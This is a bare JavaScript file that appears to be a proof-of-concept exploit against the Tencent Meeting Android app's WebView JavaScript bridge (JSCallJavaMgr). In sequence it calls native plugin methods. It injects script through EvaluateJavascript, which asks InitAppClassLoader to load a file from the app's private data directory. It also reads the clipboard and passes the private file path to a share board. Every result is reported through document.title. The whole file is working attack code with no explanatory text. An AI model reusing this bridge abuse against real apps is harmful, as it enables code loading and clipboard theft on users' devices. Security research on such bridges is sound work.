(function(){
  document.title='P142TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P142CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P142TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P142TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var zip='/data/user/0/com.tencent.wemeet.app/files/Global/Data/WebViewShare/5b0dd3209b376a05fc0678d96fb4c27c/6aede786b613dd5a2c7f0f810c71b2ea';
  var evalJs="document.title='P142EVAL:'+location.host;try{window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'CommonPlugin',method:'InitAppClassLoader',param:{path:'"+zip+"',file_path:'"+zip+"',url:'"+zip+"',apk_path:'"+zip+"'},callId:'CL'}))}catch(e){document.title='P142EVAL-NOJS:'+location.host}";
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['NX','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/nxui/webview',
      router_params:{url:official}
    }],
    ['EJ','CommonPlugin','EvaluateJavascript',{script:evalJs, javascript:evalJs, js_script:evalJs, code:evalJs}],
    ['GC','CommonPlugin','GetClipboard',{}],
    ['OM','CommonPlugin','OpenMeetingInfoShareBoard',{path:zip, file_path:zip, url:zip}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P142TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P142-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
